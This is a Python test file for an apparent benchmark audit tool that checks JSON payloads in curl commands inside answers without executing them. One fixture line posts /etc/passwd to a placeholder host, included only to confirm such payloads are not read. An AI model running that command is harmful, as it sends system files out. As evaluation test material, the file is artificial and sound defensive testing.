from bench.code_audit import audit_record, inspect_answer


def test_valid_mango_operator_payload_is_data_never_shell_execution():
    answer = '''```bash
curl https://example.invalid/db/_find \\
  -H 'Content-Type: application/json' \\
  -d '{"selector":{"$or":[{"year":2020},{"year":2021}]}}'
```
'''
    record = audit_record({"task_id": "one", "answer": answer})
    assert record["invalid_json_payloads"] == 0
    assert record["blocks"][0]["checks"][0]["status"] == "valid_json_syntax"
    assert record["commands_executed"] == 0
    assert not record["semantic_quality_validated"]
    block = record["blocks"][0]
    assert answer[block["start"]:block["end"]] == block["content"]


def test_complete_curl_payload_errors_are_independent_of_answer_truncation():
    answer = '''```sh
curl https://example.invalid -d '{"selector":{"$or":[{"year":2020},{"year":2021]}}'
curl https://example.invalid --data-raw '{"selector":{"author":{"$exists":true)}}}'
```
The answer continues here.
'''
    record = audit_record({"task_id": "two", "answer": answer, "truncated": False})
    assert record["invalid_json_payloads"] == 2
    assert all(c["column"] > 0 for c in record["blocks"][0]["checks"])
    assert not record["answer_truncated"]


def test_json_files_nonjson_data_and_unknown_languages_are_not_executed():
    answer = '''```json
{"valid": true}
```
```bash
curl example.invalid --data-binary @/etc/passwd
curl example.invalid --data=name=value
```
```python
raise RuntimeError("never execute")
```
'''
    blocks = inspect_answer(answer)
    assert blocks[0]["checks"][0]["status"] == "valid_json_syntax"
    assert [c["status"] for c in blocks[1]["checks"]] == ["external_payload_not_read", "non_json_payload_not_assessed"]
    assert blocks[2]["coverage"] == "not_assessed"


def test_shell_quote_failure_is_not_an_api_or_json_verdict():
    blocks = inspect_answer("```shell\ncurl url -d '{\"x\":1}\n```\n")
    assert blocks[0]["checks"][0]["status"] == "unparsed_shell"


def test_indented_markdown_fences_and_unrelated_command_flags():
    text = '''1. Example:
     ```bash
     curl url -d '{"selector":{"$exists":true)}}'
     printf --data='{invalid}'
     ```
'''
    blocks = inspect_answer(text)
    assert len(blocks) == 1 and len(blocks[0]["checks"]) == 1
    assert blocks[0]["checks"][0]["status"] == "invalid_json"
